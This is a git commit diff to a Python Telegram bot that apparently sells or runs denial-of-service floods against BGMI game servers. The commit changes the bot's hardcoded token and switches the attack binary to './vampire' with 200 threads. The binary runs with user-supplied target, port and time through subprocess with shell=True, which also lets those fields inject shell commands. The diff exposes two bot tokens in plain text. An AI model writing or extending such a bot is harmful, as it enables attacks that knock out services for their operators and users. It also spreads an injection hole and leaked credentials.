605f2406df9382655e9225a20c79bf1172e1e561
Thorrr121 <bgmidata0013@gmail.com>
2024-12-02 20:53:43 +0530

    Update m.py

--- m.py
+++ m.py
@@ -7,7 +7,7 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7492176838:AAFfim4E3kz6xkTVdYYmmr4yaYIQpggZn04')
+bot = telebot.TeleBot('7231434237:AAF6DmG85XqPvoKlH_eXfpi646jaRD3PIi8')
 
 # Admin user IDs
 admin_id = ["1383324178"]
@@ -320,7 +320,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 5"
+                full_command = f"./vampire {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
